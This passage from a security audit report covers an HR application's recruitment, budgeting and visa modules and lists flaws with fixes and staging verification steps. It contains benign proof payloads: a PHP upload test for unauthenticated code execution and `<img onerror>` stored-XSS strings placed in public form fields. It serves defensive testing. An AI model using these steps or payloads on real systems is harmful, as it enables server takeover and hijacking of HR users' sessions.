#### W-04 · MEDIUM · A HOD can submit or overwrite another department's manning budget

**Where:** `ManningResponseController.php`. The department restriction exists in some methods but not in their siblings (invariant #7):

| Method | Department check? |
|---|---|
| `saveDraft` (`:334`) | ✅ yes — `:363` |
| `getCategoriesWithData` (`:456`), `closeManningRequestNotification` (`:491`) | ✅ yes — `:461`, `:497` |
| **`store`** (`:151`, final **submit** of the manning request) | ❌ **no** |
| **`updateBudgetData`** (`:836`, edit a budget line's current/proposed salary and months) | ❌ **no** |
| **`updateParentTotal`** (`:879`, overwrite a department's total budget) | ❌ **no** |

So a HOD can't *save a draft* for another department, but can **submit** one, **edit its salary lines** and **overwrite its total**. All three are resort-scoped.

**Fix:** add the same check `saveDraft` uses (`:362-365`) to `store`, and to `updateBudgetData` / `updateParentTotal` (using the department of the record being changed, not a client-sent value). Once W-03's helper exists, use it here too, so HR and Finance can still edit any department.

**VERIFY:** §0.5 harness, same resort, as the HOD of department X: call `store` with `dept_id` = department Y → `403`, and no new/changed `manning_responses` row for Y. Call `updateBudgetData` on a `store_manning_response_children` row belonging to Y → `403`, row unchanged. Call `updateParentTotal` for Y → `403`, `Total_Department_budget` unchanged. Repeat all three for department X → success.

---

#### W-05 · LOW · Records from other resorts accepted as references

These don't leak another resort's data **directly**. They let a user store a link to another resort's record inside their own resort's data, which then shows up on their screens, and they're one careless query away from a real leak. Fix all of them with `Rule::exists(<table>, 'id')->where('resort_id', <caller's resort>)`, the pattern `GrievanceAppealController.php:204-207` already uses.

| Where | Field accepted without a resort check |
|---|---|
| `BudgetController::saveBudgetCostAssignment` (`:3255+`, rule `budget_costs.*.cost_id => exists:resort_budget_costs,id`) and `ResortBudgetCost::find(...)` at `:3343, 3353, 3438, 3448, 4686, 4698, 4723, 4923, 4935, 4960` | `cost_id` — another resort's cost item (title + amount) gets pulled into this resort's budget maths and configuration |
| `saveBudgetCostAssignment` | `employee_id`, `position_id` (only `integer`) |
| `ManningController::store_departments` (`:415`), `store_sections` (`:693`), `store_positions` (`:982`) | parent `division_id` / `dept_id` (only `required`) |
| `ManningController` inline updates (`:483`, `:761`, `:1053`) and the name lookups at `:557`, `:845-846`, `:1148-1150` | parent `division` / `department` / `section` from the request |

**VERIFY:** for each row, a request with a **resort B** id from a resort A user → `422` validation error, nothing saved. Paste the results.

---

#### W-06 · LOW · Budget/occupancy import files kept forever on local disk

`BudgetController::UploadconfigFiles` (`:2915`, `->store('imports')`) and `OccupancyController` (`:191`, `->store('imports', 'local')`) save uploaded spreadsheets with raw `store()` (not `StorageHelper`, against invariant #2) and don't delete them after a successful import. Same fix as P-04: delete after import, or process straight from the upload's temp path. (The file types **are** validated: `mimes:xls,xlsx` / `xls,xlsx,csv`, `max:2048`.)

**VERIFY:** after a successful import on staging, `storage/app/imports/` doesn't contain the new file.

---

#### Manning & Budgeting — checked and found clean
- **XSS:** no user-typed text is printed raw. The `rawColumns` in `ManningController.php:162, 399, 679, 968` render division/department/section/position names and fixed badges (HR-controlled). The AI-insights panel escapes the AI text before inserting it (`workforce_planning/dashboard.blade.php:1442`: `$('<div>').text(why).html()`). The one `{!! !!}` (`workforce_planning/hoddashboard.blade.php:22`) prints a fixed page title.
- **Org-structure edits and deletes** (divisions, departments, sections, positions) are all resort-scoped (`ManningController.php:234, 487, 767, 1063, 311, 579, 1180`).
- **Dashboards** use the logged-in user's own id (`WorkforcePlanningDashboardController.php:832, 887`).
- **AI budget comparison** (`CompareBudgetRegenerateAi`, `:721`) checks both the budget and the department belong to the resort.
- **Send to Finance / Send to GM** is correctly restricted to HR / Finance / GM on the server.

#### Manning & Budgeting — non-security items (backlog)
| File:line | Item |
|---|---|
| `routes/resort_route.php:257` | `GET /resort/budget/get` → `BudgetController@ajaxViewBudget`, **which doesn't exist**. Always a 500. Remove the route or restore the method. |
| `app/Http/Controllers/Resorts/{DepartmentController,DivisionController,SectionController,PositionController}.php` | **Dead code**: no route points to them (the live versions are in `ManningController`, and the admin panel uses separate `Admin\*` controllers). Their `inlineUpdate` / `destroy` use **unscoped** `find($id)` (e.g. `DepartmentController.php:115, 129`). Harmless today, but one route line away from a cross-resort delete. **Delete these four files.** |

---

### 7.3 Talent Acquisition (recruitment)

**Scope audited:** internal portal: `app/Http/Controllers/Resorts/TalentAcquisition/` (all 10 controllers: `ApplicantsController`, `VacancyController`, `ConfigController`, `InterviewAssessmentController`, `JobAdvertisementController`, `JobDescriptionController`, `OfflineInterviewController`, `QuestionnaireController`, `TaDocumentTemplateController`, `TaEmailTemplateController`) + `TalentAcquisitionDashboardController.php`. **Public, no-login side** (`routes/resort_route.php:17-58`): `ApplicantController.php` (application form), `InterviewInvitationController.php`, `OfferLetterResponseController.php`, `ContractResponseController.php`, `ConsentResponseController.php`, `AvailabilityResponseController.php`. Helpers `Common::TalentAcquisitionFolder()` / `ApplicantWiseStorefileaws()`. Views in `resources/views/resorts/{talentacquisition,applicant_form,offer_letter,contract,consent,availability,interview_invitation,offline-interview}/`. **149 portal routes + 24 public routes.** No mobile API.

**Why this module is different:** it's the only module that takes input from **anonymous people on the internet** (job applicants). Anything an applicant types or uploads ends up in front of HR. So an applicant is effectively an untrusted attacker who gets to put content on HR's screen.

**Good news first:**
- **Tenant isolation is almost entirely clean.** 176 lookups were flagged by the script and traced. Applicant files, the passport/CV zip download, applicant delete, offers, contracts, salary allocation, notes, AI analysis, talent pool, questionnaires and vacancy approvals are all resort-scoped (Ankit's earlier Talent Acquisition leak fix held). Only the two write paths in T-04 are open.
- **The emailed response links are safe to guess against:** interview, offer, contract, consent and availability tokens are random UUIDs (`ApplicantsController.php:1430, 3134, 3275, 3364, 3411`), and each response page checks the current status before accepting or declining again.
- Applicant drafts are stored in the visitor's own **session**, so one applicant can't read another's draft.
- Applicant names are escaped in the server-built tables (`InterviewAssessmentController.php:117-118` uses `e()`, `VacancyController.php:2314` uses `htmlspecialchars`) and in the comments block (`Applicants/index.blade.php`, `commentHtml` uses `.text()`). The AI summary text is escaped too. The problems are the specific spots in T-02.

---

#### T-01 · CRITICAL (LIKELY — confirm on server) · Public, no-login upload into the public web folder

**Where:** `ApplicantController::saveDraft()`, public route `POST /resort/applicant-form/save-draft` (`routes/resort_route.php:20`), **no login, no CSRF exemption needed (the form page gives the token to anyone)**:
```php
// ApplicantController.php:132-135
if ($request->hasFile('video')) {
    $video = $request->file('video');
    $path = $video->store('temp/videos', 'public');   // no type rule, no size rule
    $sessionData['video_path'] = $path;
```
and `getDraftStepData()` (`POST /resort/applicant-form/get-draft`, `:150-160`) returns the saved step data, **including `video_path`**, to the same visitor.

**Why it's critical:** the `public` disk is `storage/app/public`, served to the web via the `public/storage` link (`config/filesystems.php:101-102`). `store()` names the file with a random name plus an extension **guessed from the file's content**, so a file whose content is PHP code gets a `.php` extension. An anonymous visitor can:
1. open any application link (they're public job ads);
2. POST a "video" that is actually a PHP script to `save-draft`;
3. call `get-draft` to learn its exact path;
4. open `https://<domain>/storage/temp/videos/<name>.php`.

If the web server runs PHP inside `public/storage` (the default nginx/Apache Laravel setup does), that's **code execution on the server with no login at all**: every resort's data, the `.env`, everything. This is the same server weakness as **S3-02**, but reachable by **anyone on the internet** instead of a logged-in user. Even if PHP doesn't run there, the endpoint lets anyone store unlimited files of any size in the public folder: HTML pages served from **your domain** (phishing), or enough junk to fill the disk.

**Fix:**
1. `saveDraft`: validate the video exactly like the real video question does: `'video' => 'nullable|file|mimetypes:video/mp4,video/webm,video/ogg,video/quicktime|max:51200'`. Store it through `StorageHelper` on a **non-public** path (e.g. `temp/applicant-drafts/<session id>/<Str::uuid()>.<mp4|webm|…>`, choosing the extension from the **validated MIME type**, never the client name or content guess).
2. `getDraftStepData`: don't return internal storage paths. Return a flag like `has_video: true` instead.
3. Apply the server-level rule from **S3-02 step 3** (no PHP execution under `/storage/`). That single nginx/Apache rule neutralises T-01 and S3-02 together, and should be done **first**, today.
4. `HUMAN`: list `storage/app/public/temp/videos/` on every server. Any file that isn't a real video (especially `.php`, `.phtml`, `.phar`, `.html`, `.svg`) → treat as a possible compromise and investigate before deleting.

**VERIFY:**
```bash
grep -n "store('temp/videos', 'public')" app/Http/Controllers/Resorts/ApplicantController.php
```
Expected: *(no output)*
- `HUMAN` on staging **before** the fix (to confirm severity), logged out: open an application link, then from the browser console POST `FormData` with `step=1` and a file `v.mp4` whose content is `<?php echo "RCE-" . (7*6);` to `/resort/applicant-form/save-draft`, call `get-draft` for `step=1`, and open `/storage/<video_path>`. If the page shows `RCE-42`, it's **confirmed unauthenticated code execution**: escalate immediately. **After** the fix: the upload is rejected (422), `get-draft` doesn't return any path, and a `.php` placed manually under `public/storage` returns `403`.

---

#### T-02 · HIGH · Stored XSS: text typed by anonymous applicants runs as code in HR's browser  ·  *mostly a Frontend fix (JavaScript)*

**How the attack works:** an applicant (anyone) puts `<img src=x onerror="…">` in their **name** on the public application form, or in the **reason** box when declining an interview, offer or contract on the public response pages. When HR opens that applicant in the portal, the script runs **as HR**, inside HR's logged-in session, and can do anything HR can: read every applicant's passport, change offers, and so on.

| # | Where it's rendered raw | Field (who types it) |
|---|---|---|
| a | `resources/views/resorts/talentacquisition/Applicants/index.blade.php:707` — AI match-score popup (`resort.ta.WaiInsights` success handler, request at `:699`): `'<span class="fw-bold">' + (res.applicant || 'Applicant') + '</span>'` | applicant's **first + last name** (public form, `ApplicantController.php:314-315`, only `string|max:100`) |
| b | `Applicants/index.blade.php:951` and its sibling at `:1205`: `<strong>Reason:</strong> ${response.data.rejectionReason}` | reason typed when **declining an offer letter or contract** (public pages, `OfferLetterResponseController.php` / `ContractResponseController.php` `reject()`, stored as `applicant_offer_contracts.rejection_reason`) |
| c | `Applicants/index.blade.php:817`, `:942`, `:1071`: `<strong>Reason:</strong> ${…interviewRejectionReason}` | reason typed when **declining an interview invitation** (public page, `InterviewInvitationController::reject()`, stored as `rejection_reason`) |
| d | **Email**, not a web page: `InterviewInvitationController::notifyInterviewer()` (`:169`) puts the raw decline reason into an HTML table in the email sent to the interviewer | same interview decline reason — lets an applicant put **links / fake content inside an internal email** from your system |
| e | `resources/views/resorts/talentacquisition/Applicants/rejected.blade.php:204-205` — `render: function(data) { return '<span … title="'+data+'">'+data+'</span>' }` | HR rejection comments (`ApplicantsController.php:2932`, `Comments`). Internal text, lower risk, but same fix. |

**Fix (JavaScript/Blade — no backend change needed for a-c, e):**
1. Add one small escape helper to the Talent Acquisition views (or reuse the one from S3-04):
   ```js
   function escHtml(s) { return $('<div>').text(s == null ? '' : String(s)).html(); }
   ```
2. Wrap every value in the table: `escHtml(res.applicant || 'Applicant')`, `${escHtml(response.data.rejectionReason)}`, `${escHtml(nr.interviewRejectionReason)}`, `${escHtml(response.data.interviewRejectionReason)}`, and in `rejected.blade.php` both the `title` attribute and the text.
3. **Invariant #7:** grep **all** of `resources/views/resorts/talentacquisition/` and `offline-interview/` for other `${…}` / `' + x + '` insertions of applicant-sourced fields (`first_name`, `last_name`, `email`, `mobile`, `address`, `job_title`, `employer_name`, `institute_name`, questionnaire answers, `rejection_reason`) and wrap them the same way. The audit found only the lines above, but confirm.
4. **Email (d), backend:** in `notifyInterviewer()`, escape the reason: `e($reason)` (and `nl2br` if line breaks matter). Check the other TA emails that include applicant text (candidate name in subjects/bodies) the same way.
5. Defence in depth, backend: add `max:1000` and strip control characters on the three public `rejection_reason` inputs (right now there's no validation at all). This limits damage; it does **not** replace escaping on output.

**VERIFY:**
```bash
grep -nE '\$\{(response\.data\.rejectionReason|nr\.interviewRejectionReason|response\.data\.interviewRejectionReason)\}|\(res\.applicant \|\| ' resources/views/resorts/talentacquisition/Applicants/index.blade.php
```
Expected: *(no output)*
- `HUMAN` browser test on staging (required): submit an application with first name `<img src=x onerror=alert('XSS-name')>`. Get it to interview stage, then decline the interview from the emailed link with reason `<img src=x onerror=alert('XSS-int')>`. For a second test applicant, send an offer and decline it with reason `<img src=x onerror=alert('XSS-offer')>`. As HR, open each applicant's detail row and the AI match-score popup, and the Rejected list. **No alert may appear anywhere**; the text shows literally. Also check the interviewer's email shows the reason as plain text.

---

#### T-03 · HIGH · Public applicant uploads not type-checked

**Where (all public, no login):**

| Endpoint | Line | Problem |
|---|---|---|
| `POST /resort/applicant_form/store` → `applicant_formStore` | `ApplicantController.php:316-317` | `curriculum_file` and `passport`: `required|file|max:5120`, **any file type** (`.html`, `.svg`, `.exe`, `.js`, macro-enabled Office files…). HR will open these. |
| same | `:318-319` | `profile_picture`, `full_length_photo` allow **`svg`**, which can contain script. |
| same | `:429-438` | `other_document[]`: **no validation at all** (type, size or count). |
| `POST /resort/applicant_temp/video-store` → `applicant_tempVideoStore` | `:747-800` | Validation **commented out** (`:751-756`). Takes **`resort_id` and `vacancy_id` from the request** and writes the file into **that resort's** talent-acquisition folder (`Common::TalentAcquisitionFolder()`), keeping the **uploader's own file extension**, then returns the storage path. Anyone can drop any file into any resort's recruitment storage. |

**Why it matters:** files from anonymous applicants are the classic way into an HR team: a "CV" that's really an HTML phishing page, a script-bearing SVG, or malware. Unlimited uploads also let anyone fill your storage bucket at your cost.

**Fix:**
1. `curriculum_file`: `mimes:pdf,doc,docx|max:5120` (the same list `extractCv` already enforces at `:175`). `passport`: `mimes:pdf,jpg,jpeg,png,heic,heif|max:5120`. Photos: **remove `svg`**. `other_document`: `array|max:5`, `other_document.*` → `file|mimes:pdf,doc,docx,jpg,jpeg,png,heic,heif|max:5120`.
2. `applicant_tempVideoStore`: restore validation (`'video' => 'required|file|mimetypes:video/mp4,video/webm,video/ogg,video/quicktime|max:51200'`), and **don't trust `resort_id` / `vacancy_id` from the request**: resolve them from a valid, unexpired application link (see T-06), the same way `showapplicantForm` does. Choose the stored extension from the validated MIME type.
3. In `Common::TalentAcquisitionFolder()` / `ApplicantWiseStorefileaws()`, stop using `getClientOriginalExtension()` for the stored name. Use the validated file's `extension()` instead.

**VERIFY:** as an anonymous visitor on staging, submit the application form with `cv.html`, `passport.svg`, a `.svg` profile picture, and an `other_document` `.exe` → each is rejected with a 422 naming the field. POST a `.php` file to `applicant_temp/video-store` with any `resort_id` → 422. A normal submission (PDF CV, JPG passport and photos, MP4 video) still succeeds end to end.

---

#### T-04 · HIGH · Cross-resort writes in two places

| Where | What an authenticated user of resort A can do to resort B |
|---|---|
| `TalentAcquisition/InterviewAssessmentController::update()` (`:187-213`, route `POST /interview-assessment/update/{id}`) | `InterviewAssessmentForm::findOrFail($id)` with **no resort check**, then overwrites the form's name, position and **entire question structure**. The siblings `edit` (`:171`), `delete` (`:216`), `saveResponse`, `viewResponse` and `downloadResponsePdf` are all scoped. Only `update` was missed. |
| `TalentAcquisition/ApplicantsController::InterviewRequest()` (`:1313+`) | `ApplicantID` and `ApplicantStatus_id` come from the request (`:1320-1321`) and are loaded with bare `find()` (`:1375, 1377, 1394, 1435`). An interview record is created **in resort A for resort B's applicant** (`:1416-1431`), and the interviewer is notified with that applicant's name. From then on resort B's applicant (name, contact, CV via the interview screens) shows up in resort A's pipeline. |

**Fix:**
- `update`: `InterviewAssessmentForm::where('resort_id', $this->resort->resort_id)->findOrFail($id)`, exactly like `edit` at `:179`.
- `InterviewRequest`: right after decoding, load the applicant **scoped**, and load the status **through** that applicant:
  ```php
  $applicant = Applicant_form_data::where('resort_id', $this->resort->resort_id)->find($ApplicantID);
  $status    = $applicant ? ApplicantWiseStatus::where('Applicant_id', $applicant->id)->find($ApplicantStatus_id) : null;
  if (!$applicant || !$status) return response()->json(['success' => false, 'message' => 'Applicant not found.'], 404);
  ```
  Then use `$applicant` / `$status` everywhere below instead of the four `find()` calls.

**VERIFY:** §0.5 harness:
- `InterviewAssessmentController@update` with a **resort B** form id and `form_name = 'X'` → `404`, and the B form's `form_name` / `form_structure` are unchanged.
- `ApplicantsController@InterviewRequest` with `ApplicantID = base64(<resort B applicant id>)` and a matching B status id → `404`, and `ApplicantInterViewDetails::where('Applicant_id', <B applicant>)->where('resort_id', <A>)->exists()` → `false`.
- Same-resort control for both → still succeed.

---

#### T-05 · HIGH · Any portal user can open applicant documents and run hiring actions  ·  ✅ DECIDED

**What it is:** only **10 of 149** Talent Acquisition routes are listed in `module_pages` (X-01), mostly menu pages. `ApplicantsController` has a lot of **interview-round** logic (which rank interviews in which round), but the actions below have **no role check at all**. Every portal user in the resort can call them:

| Action | Method (`ApplicantsController.php` unless noted) |
|---|---|
| Open any applicant's documents / **download all their files as a ZIP** (passport, CV, photos, certificates) | `GetAwsFiles` (`:2671`), `GetAllAwsFiles` (`:2742`), `DownloadAllFilesZip` (`:2802`) |
| **Delete** an applicant (and all their interviews, languages, education) | `destoryApplicant` (`:1920`), `deleteTalentPoolApplicant` (`:3475`) |
| **Send an offer letter / contract**, request consent, check availability | `sendOfferLetter` (`:3064`), `sendContract` (`:3207`), `sendConsentRequest` (`:3347`), `checkAvailability` (`:3393`) |
| **Set the new hire's salary** | `saveSalaryAllocation` (`:3503`) |
| Revert an applicant's status, delete pending interviews, send interview emails | `RevertBack` (`:2634`), `DeletePendingInterview` (`:1628`), `SendInterviewEmail` (`:1568`) |
| Run AI analysis on applicants | `WaiApplicantInsights` (`:77`), `GenerateApplicantAiAnalysis` (`:723`) |
| Recruitment settings, email templates, document templates, job adverts, offline interviews | `ConfigController` (20 methods, **0** checks), `TaEmailTemplateController`, `TaDocumentTemplateController`, `JobAdvertisementController`, `OfflineInterviewController` (no permission checks) |

(Vacancy **approval** is correctly role-checked: `ConfigController::TaApprovedVcanciesNotification` resolves the approver's rank from the logged-in user and scopes the request to the resort.)

**✅ DECIDED by the product owner (2026-09-26) — who may access recruitment** (the recommended default below was accepted as-is):
- **HR (the talent acquisition team):** full access: all vacancies and applicants, documents, offers, contracts, salary allocation, settings, templates, job adverts.
- **GM:** vacancy approvals and final hiring approvals **as the existing interview/approval rounds already define**, plus read access to the applicants in those approvals. No settings, no deleting.
- **HOD / EXCOM:** raise vacancy requests for **their own department**, and see and interview **only applicants for their own department's vacancies**, in the rounds assigned to them. No offers, contracts or salary, no settings, no bulk document download.
- **Interviewers (anyone assigned to an interview round):** only the applicants they're assigned to, for that round.
- **Everyone else, including L&D managers:** no access.

**Fix (after the decision):** add one helper, e.g. `Common::recruitmentAccess($employee, ?Applicant_form_data $applicant = null): string` (`'full' | 'approve' | 'own_department' | 'assigned' | 'none'`), built on `Common::getEmployeeRankPosition()` and the existing interview-round assignments. Gate every method in the table. File downloads and ZIP must require `'full'`, or the applicant must be in the caller's own department / assigned interview. Offers, contracts, salary, delete and settings → `'full'` only.

**VERIFY:** users of one resort: HR, GM, HOD of department X, HOD of department Y, an assigned interviewer, an ordinary portal user. Take an applicant for a department-X vacancy and call each method in the table. Paste `Action | HR | GM | HOD-X | HOD-Y | interviewer | ordinary`. Expected: matches the decided rules. For every `403`, nothing was sent, deleted or downloaded (check `applicant_offer_contracts`, `applicant_form_data`, mail log).

---

#### T-06 · MEDIUM · Public forms: no rate limit, expired links still work, submissions not tied to a valid link

**Where:**
- **No rate limiting or bot protection** on any public Talent Acquisition POST (`routes/resort_route.php:20-34`: `save-draft`, `get-draft`, `applicant_form/store`, `applicant-form/cv-extract`, `applicant_temp/video-store`, `applicant_temp/video-remove`). A script can flood any resort with fake applicants, fill storage, and run **unlimited AI CV extractions** (`extractCv` calls the AI service for every request, `:183-203`) at your cost.
- **Expired application links still work:** `showapplicantForm` checks `link_Expiry_date`, but the `return` that should stop an expired link is **commented out** (`ApplicantController.php:91-100`), so the form loads anyway.
- **Submission isn't tied to the link:** `applicant_formStore` takes `resort_id` and `vacancy_id` straight from hidden form fields (`:320-321`, only `integer`). Anyone can submit an application into **any resort / any vacancy**, including closed ones, without ever having a link. The vacancy isn't checked against the resort either (`showapplicantForm` `:103` loads the vacancy by id alone).

**Fix:**
1. Add `->middleware('throttle:<name>')` to all six public POST routes, with a named limiter in `RouteServiceProvider` (e.g. 10/minute per IP for form steps, 3/minute per IP for `cv-extract` and `video-store`, 5/hour per IP + email for `applicant_form/store`). Follow the pattern of the existing `mobile-login` / `resort-login` limiters.
2. Restore the expired-link block at `:91-100`: return the expired-link view / redirect.
3. Put the **encoded link id** (the same `{id}` the form page was opened with) in the form, and in `applicant_formStore` / `applicant_tempVideoStore` re-resolve `resort_id` + `vacancy_id` **from the `ApplicationLink` record** (checking it exists, isn't expired, and its vacancy belongs to that resort and is open). Ignore the hidden `resort_id` / `vacancy_id` fields.
4. Optional, recommended for an international launch: add a CAPTCHA (e.g. Cloudflare Turnstile / reCAPTCHA) to the final submit.

**VERIFY:** 20 quick POSTs to `cv-extract` from one IP → later ones get `429`. Opening an application link whose `link_Expiry_date` is in the past → the expired page, not the form. Submitting the form with a tampered `resort_id` / `vacancy_id` (different resort, or a closed vacancy) → rejected, and no `applicant_form_data` row created.

---

#### T-07 · LOW · Smaller items

| Where | Issue | Fix |
|---|---|---|
| `ApplicantController.php:183` | `extractCv` reads the AI service URL with `env('AI_BASE_URL') ?: env('AI_URL', 'http://localhost:8001')`. With config cached in production (see S2-07 evidence), `env()` returns null, so it **always calls `localhost:8001`**. CV auto-fill is probably broken live. | Add the URL to `config/services.php` (e.g. `'cv_extractor' => ['url' => env('AI_BASE_URL', env('AI_URL'))]`) and read it with `config(...)`. |
| `ApplicantController.php:816-819` (public `POST /resort/applicant_temp/video-remove`) | Always runs `Temp_language_video_store::find('1')->delete()`: deletes **row #1** for anyone who calls it (and 500s once it's gone). | Remove the route or make it delete only the caller's own temp video (by an id stored in their session). |
| `Applicants/index.blade.php:793` | Interview `MeetingLink` (typed by HR) is put into `href` unchecked. A `javascript:` link would run code when clicked. | Allow only `https://` links when saving and when rendering. |
| `ApplicantController.php:766` (`applicant_tempVideoStore`) | Stores the **server's** `php_uname()` (OS, hostname, kernel) in `temp_language_video_store.os` for every upload. Not exposed today, but it's server information that doesn't belong in app data. | Remove it. |

**VERIFY:** `grep -n "env('AI_BASE_URL')" app/Http/Controllers/Resorts/ApplicantController.php` → no output. `grep -n "find('1')" app/Http/Controllers/Resorts/ApplicantController.php` → no output.

---

#### Talent Acquisition — checked and found clean
- All five emailed response flows use random UUID tokens and re-check status before accepting or declining.
- `applicant-form/cv-extract` validates the CV (`mimes:pdf,doc,docx|max:5120`).
- Server-built applicant HTML fragments (`TaUserApplicantsSideBar`, `getApplicantWiseGridWise` → Blade partials) use escaped `{{ }}`. The only `{!! !!}` in these views print pagination, the HR-written job description (CKEditor), and the resort's own terms and conditions.
- Tenant isolation: see "Good news" above. Everything except T-04 is scoped.

---

### 7.4 Visa & employee documents

**Scope audited:** `app/Http/Controllers/Resorts/Visa/` (all 12 controllers: `ConfigurationController`, `DashboardController`, `DocumentController`, `ExpiryController`, `FetchDataAiController`, `FundTransferController`, `LiabilitiesController`, `PaymentDepositRequestController`, `PaymentRequestController`, `RenewalController`, `VisaReportController`, `XpactEmployeeController`, ~10,000 lines), mobile `app/Http/Controllers/API/EmployeeDocumentController.php` and the visa methods of `API/ProfileController.php` (`getVisaCategory`, `getVisaData`), the shared file-link helper `Common::GetAWSFile()` (`app/Helpers/Common.php:9137`), and views in `resources/views/resorts/Visa/`. **82 web routes + 4 mobile routes.** All five sweep criteria applied (§7 intro).

**Why this module matters:** it holds expatriate staff's **passports, visas, work permits, medical and insurance records**, and the resort's visa **money**: payment requests, deposits, liabilities and wallet balances.

**Good news first:**
- **Tenant isolation is clean apart from V-03.** 35 lookups were flagged by the script and traced. Every employee-driven method checks the employee belongs to the caller's resort (`RenewalController::UploadSeparetFileUsingAi`, `UploadQuotaSlot`, `SubmitVerifiedDetails` `:1217`, `UpdateExpiryRecord`; `XpactEmployeeController::UpdateXpatDetails`, `PastTransectionHistory`, `EmployeeWiseVisaDocumentUpload`, `QuotaSlotMakrasPaid`; `PaymentDepositRequestController::DepositeRefundStore`; the payment schedule helper `currentScheduleCycle` and `resolveAdvanceFeeRows` are resort-scoped).
- **File links can't cross resorts:** `Common::GetAWSFile()` only returns a file whose `child_file_management` row belongs to the given resort (`Common.php:9139-9140`).
- **Mobile self-service is correct** except V-01: `getVisaData` returns only the caller's own records (`ProfileController`, `where('employee_id', $user->GetEmployee->id)`), and document **upload** (`employeeDocument`) always files the document under the caller themselves and validates the type (`:28`).
- **XSS is clean:** the `{!! !!}` in Visa views only print `Common::formatMvr(<number>)`, and the one free-text field shown in a raw column (fund-transfer comment) is escaped with `e()` (`FundTransferController.php:179`).

---

#### V-01 · HIGH · Mobile app: any employee can download every colleague's documents (passports)

**Where:** `POST resort/get-employees-docs` (`routes/api.php:69`) → `API/EmployeeDocumentController::getEmployeeDocument()` (`:112`):
```php
// EmployeeDocumentController.php:133-135
$employeesDoc = EmployeesDocument::where('resort_id', $resortId)
    ->where('document_category', $request->document_category)
    ->get();
```
It filters by **resort** and **category** only, **not by employee**, then turns every row into a working signed download link (`:145+`, via `Common::GetAWSFile`). Any staff member with the mobile app who asks for `document_category = Passport` (or any other category) gets **every colleague's documents in their resort**, with download links.

**Why it matters:** this is exactly the "pretending to be someone else / seeing someone else's data" case (criterion 5). The sibling upload endpoint (`employeeDocument`, `:40-49`) correctly files documents under the caller only, so this read side was clearly meant to be "my documents" too.

**Fix:** add `->where('employee_id', $user->GetEmployee->id)` to the query at `:133` (the upload side stores `employee_id = $employee->id`, `:45`). If HR ever needs a resort-wide document list, that belongs in the **web** Visa module behind V-02's rules, not the mobile self-service endpoint.

**VERIFY:** with mobile tokens for two employees A and B of the same resort, where B has uploaded a document in category `X`: A calls `get-employees-docs` with `document_category = X` → the response contains **none** of B's documents (only A's own, or "No documents found"). B calls it → B's documents are returned. Paste both responses (IDs and file names only, not the URLs).

---

#### V-02 · HIGH · Any portal user can open expat documents and run visa payments  ·  ✅ DECIDED

**What it is:** only **12 of 82** Visa routes are listed in `module_pages` (X-01), mostly the menu pages. Almost none of the controllers check roles in the method: `ConfigurationController`, `DocumentController`, `ExpiryController`, `FetchDataAiController`, `FundTransferController`, `LiabilitiesController`, `PaymentDepositRequestController`, `RenewalController` (14 methods) have **no** permission checks. `PaymentRequestController`, `XpactEmployeeController` and `VisaReportController` check only a few menu pages. So **any portal user in the resort** (any HOD, manager, clinic or security user) can:

| Action | Where |
|---|---|
| Open any expat's passport, visa, work permit, medical, insurance details and documents | `XpactEmployeeController` (details, documents, transaction history), `RenewalController` (renewal views, `GetEmployeeDetails`) |
| Upload / replace an employee's visa documents and run the AI extraction on them | `RenewalController::UploadSeparetFileUsingAi`, `UploadQuotaSlot`, `XpactEmployeeController::EmployeeWiseVisaDocumentUpload`, `DocumentController::CreateEmployee`, `FetchDataAiController` |
| Change expiry dates / verified details | `RenewalController::UpdateExpiryRecord`, `SubmitVerifiedDetails` |
| Create visa **payment requests**, mark fees **paid** | `PaymentRequestController::PaymentRequestSubmit`, `XpactEmployeeController::QuotaSlotMakrasPaid` |
| Refund **deposits** | `PaymentDepositRequestController::DepositeRefundStore` |
| **Move money between visa wallets** | `FundTransferController::VisaWalletToWalletTransfer` |
| Change visa configuration (fees, nationality rates, wallets) | `ConfigurationController` (20 methods, 0 checks) |

**✅ DECIDED by the product owner (2026-09-26) — who may access Visa** (the recommended default below was accepted as-is):
- **HR:** full access to all Visa screens and actions.
- **Finance:** payment requests, marking fees paid, deposits, liabilities, wallets and fund transfers. Read access to the expat list and amounts. No document uploads or expiry changes.
- **GM:** read-only dashboards and reports.
- **HOD / EXCOM / everyone else, including L&D and clinic staff:** **no access.** Employees see only their **own** visa details and documents in the mobile app (already how `getVisaData` works; V-01 fixes the documents list).

**Fix (after the decision):** gate every Visa route through the extended Permission module (X-01), with the rules above as the default ticks. Add in-method checks for the money actions (`VisaWalletToWalletTransfer`, `DepositeRefundStore`, `QuotaSlotMakrasPaid`, `PaymentRequestSubmit`) so they require HR or Finance even if a tick is set by mistake.

**VERIFY:** users of one resort: HR, Finance, GM, a HOD, a clinic user. For each row of the table, call the endpoint and paste `Action | HR | Finance | GM | HOD | clinic`. Expected: matches the decided rules. For every `403`, no document, payment, deposit, wallet or expiry row changed.

---

#### V-03 · MEDIUM · Payment requests accept employees of other resorts

**Where:** `PaymentRequestController::PaymentRequestSubmit()` (`:599`). The employees come from the keys of the `employee_ids` request array (`$employee_id = base64_decode($key)`, `:659`), and a `PaymentRequestChild` is created for each (`:704`) **without checking the employee belongs to the caller's resort**. The per-employee amounts (`VisaAmt`, `InsuranceAmt`, `WorkPermitAmt`, `MedicalAmt`, `QuotaAmt`) are taken from the browser too.

**Impact:** a user can put another resort's employee into their own resort's payment request. That person's name and visa details then appear in the request's details and PDF (`PaymentRequestDetails` / `DownloadPymentRequest` load `RequestedEmployees.resortAdmin`). The fee rows it later marks paid are resort-scoped (`resolveAdvanceFeeRows`), so the other resort's records aren't changed, but the name/visa leak and the junk request are real.

**Fix:** before the loop, check that **every** decoded employee id belongs to the resort (`Employee::whereIn('id', $ids)->where('resort_id', $rid)->count() === count($ids)`), else `422`. Recompute each fee amount on the server from the live schedule, as `resolveAdvanceFeeRows` already does for work permits and quota slots, instead of trusting `VisaAmt` etc. from the browser.

**VERIFY:** §0.5 harness: submit with one resort-B employee id in `employee_ids` → `422`, no `payment_requests` / `payment_request_children` row created. Submit with a tampered `VisaAmt` for a resort-A employee → stored amount equals the server-computed fee.

---

#### V-04 · MEDIUM · Upload gaps

| Where | Problem | Fix |
|---|---|---|
| `DocumentController::CreateEmployee` (`:164`, files read at `:195`, stored at `:234`) | `documents[]` (and `photo`, `:252`) have **no type or size validation** and go straight into the employee's File Management folder via `AWSEmployeeFileUpload`. | `documents.*` → `file|mimes:pdf,jpg,jpeg,png,heic,heif|max:5120`; `photo` → `image|mimes:jpg,jpeg,png,heic,heif|max:5120`. |
